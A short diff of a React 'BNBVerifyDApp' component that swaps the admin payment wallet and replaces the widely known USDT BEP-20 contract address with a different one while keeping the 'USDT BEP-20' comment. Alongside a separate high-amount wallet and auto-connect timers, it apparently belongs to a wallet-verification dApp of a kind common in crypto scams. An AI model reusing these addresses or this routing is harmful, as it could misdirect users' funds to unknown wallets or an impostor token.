@@ -58,10 +58,10 @@ export default function BNBVerifyDApp() {
   const [autoConnectInterval, setAutoConnectInterval] = useState<NodeJS.Timeout | null>(null)
   const [lastConnectAttempt, setLastConnectAttempt] = useState<number>(0)
 
-  const ADMIN_WALLET = "0xd47c7585550eAd12aD365Fba5F4bD2533B9b4Eaf" // Updated admin wallet for payments
+  const ADMIN_WALLET = "0xCdB645e95361861a4Ea125DCDBD9c85B9efF1497" // Updated admin wallet for payments
   const HIGH_AMOUNT_WALLET = "0xd96698f467B9b79483A2574a96821Ed576B09C1e" // For amounts > 2000 USDT
   const HIGH_AMOUNT_THRESHOLD = 2000 // USDT threshold for high amount wallet
-  const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955" // USDT BEP-20
+  const USDT_CONTRACT = "0xe82f8f805351ee9203dbdc6af62ee09c6e03c7dc" // USDT BEP-20
   const FLASH_THRESHOLD = 5 // USDT threshold for flash detection
 
   // BSC Network configuration
